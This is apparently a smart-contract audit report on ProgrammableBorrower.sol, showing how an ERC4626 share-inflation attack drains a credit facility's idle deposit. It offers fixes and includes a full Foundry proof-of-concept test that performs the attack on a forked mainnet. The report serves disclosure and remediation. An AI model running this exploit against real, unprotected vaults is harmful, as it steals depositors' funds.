### Title
ERC4626 share-price inflation can steal the programmable borrower’s idle facility assets - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary

`ProgrammableBorrower` deposits all idle CDO funds into a configured ERC4626 vault but does not verify that the deposit minted economically meaningful shares. An unprivileged depositor in that external vault can execute the classic first-deposit/share-inflation attack before the facility’s first vault deposit: mint one share, donate assets equal to the expected facility deposit, and cause the facility to receive zero shares for its deposit. The donated assets plus the facility deposit then belong entirely to the attacker’s one vault share, while the CDO’s tranche backing becomes unrecoverable.

### Finding Description

`ProgrammableBorrower` accepts any configured ERC4626 vault whose `asset()` matches the CDO underlying token. [1](#0-0)  At epoch start, it snapshots the sum of its cash and existing vault position, then deposits its entire on-hand underlying balance into the vault. [2](#0-1)  `_depositToVault` records the returned share amount only in an event and performs no `shares > 0`, minimum-share, or post-deposit value check. [3](#0-2) 

For a vulnerable ERC4626 implementation that prices deposits against its raw token balance, the attacker can first deposit `1 wei` and then directly transfer `A` underlying tokens to the vault. When the facility deposits `A`, the naive calculation `A * 1 / (A + 1)` rounds to zero shares. The facility’s cash balance is consumed, but `_currentVaultAssets()` returns zero because the facility holds no vault shares. [4](#0-3)  `_vaultNetInterest()` consequently classifies the stolen deposit as a vault loss of `A`. [5](#0-4) 

The attacker does not need a privileged role: they only need to be an ordinary depositor in the configured ERC4626 vault and a direct token sender. If the facility deposit is `A` and the attacker donates `A`, the attacker contributed `A + 1` and can redeem their sole share for `2A + 1`, extracting `A` from the facility. `onStopEpoch` can even return success when the requested shortfall exceeds the facility’s vault assets because it assumes the later IdleCDO `transferFrom` will handle the default. [6](#0-5)  IdleCDO then attempts to pull funds from the borrower and enters the default path when the transfer fails. [7](#0-6) [8](#0-7) 

### Impact Explanation

This can steal the full idle balance sent to the external vault in the same transaction as epoch activation. The loss is permanent from the pool’s perspective: the facility received no shares, has no claim on the stolen assets, and cannot fund a later principal recall. Active tranche strategy tokens remain recorded on the CDO but are no longer backed by recoverable facility assets, so a close/default finalization can leave active LPs with zero or haircut recovery.

### Likelihood Explanation

Exploitation requires the configured ERC4626 vault to be empty or effectively first-depositor-controlled and to use an inflation-vulnerable share calculation. That condition is realistic when a new external vault is configured for the programmable borrower, but a properly deployed vault with virtual shares, dead shares, or another first-deposit defense is not exploitable through this path. `initialize` and `setVault` do not enforce that the vault has such a defense; they only require a matching underlying asset. [9](#0-8) 

### Recommendation

Only integrate ERC4626 vaults with explicit inflation protection, preferably through an allowlist or factory validation rather than accepting an arbitrary matching `asset()` implementation. In `_depositToVault`, atomically validate the deposit result: require a nonzero share delta and require `vault.convertToAssets(receivedShares)` to be within a small rounding tolerance of the deposited asset amount. Reverting there prevents the epoch-start transaction from transferring pool principal into a manipulated vault. Avoid relying solely on `shares != 0`, because an attacker can return one economically worthless share while still capturing nearly all of the deposit.

### Proof of Concept

The following Foundry test uses forked USDC and a deliberately naive ERC4626 vault to reproduce the exact `ProgrammableBorrower.onStartEpoch -> _depositToVault` path.

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../../contracts/interfaces/IERC20Detailed.sol";
import "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableVault is ERC20 {
  IERC20Detailed public immutable assetToken;

  constructor(IERC20Detailed _asset) ERC20("Vulnerable Vault", "vVAULT") {
    assetToken = _asset;
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return 0;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function withdraw(
    uint256 assets,
    address receiver,
    address owner
  ) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = (assets * supply + assetsBefore - 1) / assetsBefore;
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}

contract MockCDO {
  address public immutable token;

  constructor(address _token) {
    token = _token;
  }
}

contract ProgrammableBorrowerVaultInflationTest is Test {
  address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  uint256 internal constant POOL_DEPOSIT = 1_000_000e6;

  function testShareInflationStealsFacilityDeposit() public {
    vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

    IERC20Detailed usdc = IERC20Detailed(USDC);
    InflatableVault vault = new InflatableVault(usdc);
    MockCDO cdo = new MockCDO(USDC);
    ProgrammableBorrower borrowerAdapter = new ProgrammableBorrower();

    address attacker = makeAddr("attacker");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");

    borrowerAdapter.initialize(
      address(vault),
      address(cdo),
      address(this),
      manager,
      borrower,
      0
    );

    // The programmable borrower has received the CDO's idle principal.
    deal(USDC, address(borrowerAdapter), POOL_DEPOSIT);

    // Attacker becomes the vault's first depositor and inflates its share price.
    deal(USDC, attacker, POOL_DEPOSIT + 1);
    vm.startPrank(attacker);
    usdc.approve(address(vault), 1);
    vault.deposit(1, attacker);
    usdc.transfer(address(vault), POOL_DEPOSIT);
    vm.stopPrank();

    // POOL_DEPOSIT * 1 / (POOL_DEPOSIT + 1) rounds to zero vault shares.
    vm.prank(address(cdo));
    borrowerAdapter.onStartEpoch(0);

    assertEq(vault.balanceOf(address(borrowerAdapter)), 0);
    assertEq(borrowerAdapter.vaultSharesBalance(), 0);
    assertEq(borrowerAdapter.totalUnderlying(), 0);
    assertEq(borrowerAdapter.availableToBorrow(), 0);
    assertEq(borrowerAdapter.totalInterestDueNow(), 0);

    // The attacker's single share now owns the donation and the facility deposit.
    assertEq(vault.convertToAssets(1), POOL_DEPOSIT * 2 + 1);

    // A close request reports that the vault cannot economically cover principal.
    vm.prank(address(cdo));
    bool success = borrowerAdapter.onStopEpoch(POOL_DEPOSIT, true);
    assertTrue(success);

    // IdleCDO's following transferFrom would fail and route to borrower default.
  }
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-119)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-169)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-219)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-346)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-549)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-408)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-504)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
```
